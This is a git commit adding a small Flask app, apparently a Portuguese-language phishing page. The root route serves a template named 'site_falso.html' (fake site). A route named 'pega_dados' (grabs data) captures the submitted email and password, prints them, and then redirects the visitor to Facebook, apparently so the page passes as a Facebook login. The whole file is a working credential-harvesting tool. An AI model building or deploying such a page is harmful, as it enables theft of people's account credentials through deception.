357604a95b2dab4708f6c77e8189003915e950c6
Vitor Terra <vterra2008@gmail.com>
2024-06-18 14:06:47 -0300

    Commit Inicial

---
+++ app.py
@@ -0,0 +1,16 @@
+
+
+from flask import Flask,render_template,request,redirect 
+
+app = Flask(__name__)
+@app.route('/')
+def pagina_inicial():
+    return render_template('site_falso.html')
+
+@app.route("/pega_dados",methods = ['POST'])
+def pega_dados():
+    email= request.form['email']
+    senha = request.form['pass']
+    print(f'EMAIL: {email} \n SENHA: {senha}')
+    return redirect('https://www.facebook.com/?locale=pt_BR')
+app.run()
